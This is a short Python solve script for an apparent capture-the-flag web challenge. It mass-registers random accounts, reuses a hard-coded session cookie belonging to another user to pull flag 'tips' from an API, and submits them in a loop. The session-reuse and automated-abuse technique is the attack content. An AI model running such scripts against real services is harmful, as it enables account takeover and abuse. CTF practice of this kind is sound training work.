import requests
import string
import random
session = requests.session()
from bs4 import BeautifulSoup

URL = "ea93d62c-ebf8-428f-80ec-b60297f35fce.spring.mireactf.ru"
PORT = 80
def gen_str():
    characters = string.ascii_lowercase
    generated_string = ''.join(random.choice(characters) for _ in range(8))
    return generated_string

for i in range(101):
    usr = gen_str()
    burp0_url = f"http://{URL}:{PORT}/api/register"
    burp0_cookies = {"_ga_Y4WGTSFL6S": "GS1.1.1707988003.1.1.1707989158.0.0.0", "_ga": "GA1.1.1707848077.1707988004", "_ym_uid": "1707988004415463952", "_ym_d": "1707988004", "session": "eyJ1c2VyIjoiZGExMTIzIn0.ZerVAA.zy8OmwD1qRill0pJV-RQtAbL4k0"}
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "application/json", "Origin": "http://localhost:5000", "Connection": "close", "Referer": "http://localhost:5000/login", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin"}
    burp0_json={"password": usr, "username": usr}
    session.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, json=burp0_json)


    burp0_url = f"http://{URL}:{PORT}/api/login"
    burp0_cookies = {"_ga_Y4WGTSFL6S": "GS1.1.1707988003.1.1.1707989158.0.0.0", "_ga": "GA1.1.1707848077.1707988004", "_ym_uid": "1707988004415463952", "_ym_d": "1707988004", "session": "eyJ1c2VyIjoiZGExMTIzIn0.ZerVAA.zy8OmwD1qRill0pJV-RQtAbL4k0"}
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "application/json", "Origin": "http://localhost:5000", "Connection": "close", "Referer": "http://localhost:5000/login", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin"}
    burp0_json={"password": usr, "username": usr}
    session.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, json=burp0_json)


    burp0_url = f"http://{URL}:{PORT}/api/user"
    burp0_cookies = {"_ga_Y4WGTSFL6S": "GS1.1.1707988003.1.1.1707989158.0.0.0", "_ga": "GA1.1.1707848077.1707988004", "_ym_uid": "1707988004415463952", "_ym_d": "1707988004", "session": "eyJ1c2VyIjoiYWR3YWR3YWR3YWQifQ.ZerWmQ.pJl7jZxEhL0YyF0tVrAxeZLXhWs"}
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Referer": "http://localhost:5000/info", "Connection": "close", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin"}
    r = session.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
    tips = r.json()['tips'].split('\n')


    burp0_url = f"http://{URL}:{PORT}/submit"
    burp0_cookies = {"_ga_Y4WGTSFL6S": "GS1.1.1707988003.1.1.1707989158.0.0.0", "_ga": "GA1.1.1707848077.1707988004", "_ym_uid": "1707988004415463952", "_ym_d": "1707988004", "session": "eyJ1c2VyIjoiYWR3YWR3YWR3YWQifQ.ZerWmQ.pJl7jZxEhL0YyF0tVrAxeZLXhWs"}
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "application/json", "Origin": "http://localhost:5000", "Connection": "close", "Referer": "http://localhost:5000/submit", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin"}
    burp0_json={"flag": tips[-1]}
    session.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, json=burp0_json)
    print(i)

burp0_url = f"http://{URL}:{PORT}/submit"
r = requests.get(burp0_url)
soup = BeautifulSoup(r.text, 'html.parser')

print(soup.find(id="remainFlags").text)

